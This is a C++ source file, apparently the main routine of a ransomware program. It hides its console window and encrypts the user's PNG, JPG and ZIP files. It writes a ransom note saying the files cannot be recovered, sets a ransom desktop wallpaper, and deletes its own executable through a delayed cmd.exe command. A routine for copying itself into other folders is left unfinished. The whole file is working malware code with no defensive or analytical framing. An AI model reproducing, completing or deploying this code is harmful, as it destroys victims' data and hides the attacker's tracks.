/***********************************************************************************\
* Created: 6/30/2017 by Ali Sepehri-Amin
* Version: 1.00
* Description: A main process
\***********************************************************************************/


#include <fstream>
#include <Windows.h>
#include <strsafe.h>
#include "Encryption.h"

using namespace std;

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"")

/* Delete after encryption process */
void SelfDelete()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

int main()
{
	/* Hide process from user */
	FreeConsole();

	CEncryption* encrypt = new CEncryption;
	encrypt->EncryptPng();
	encrypt->EncryptJpg();
	encrypt->EncryptZip();

	ofstream infoFile;
	infoFile.open("Readme if you want your files!.txt");
	infoFile << "There is no way to get back your files. Happy coding :)";
	infoFile.close();

	/* Get all files and folder for copy ransomware in another folder (NOTE: this section under code fixing, Be patient) */
	WIN32_FIND_DATA file;
	HANDLE search_handle = FindFirstFile("C:\\*", &file);
	string files;
	if (search_handle)
	{
		do
		{
			files = file.cFileName;
			if (files == "Program Files")
			{
				// TODO: Copy executable file to folder
			}
			
		} while (FindNextFile(search_handle, &file));
		CloseHandle(search_handle);
	}
	/* Change the windows background */
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)"ransom.jpg", SPIF_UPDATEINIFILE);
	
	SelfDelete();
}
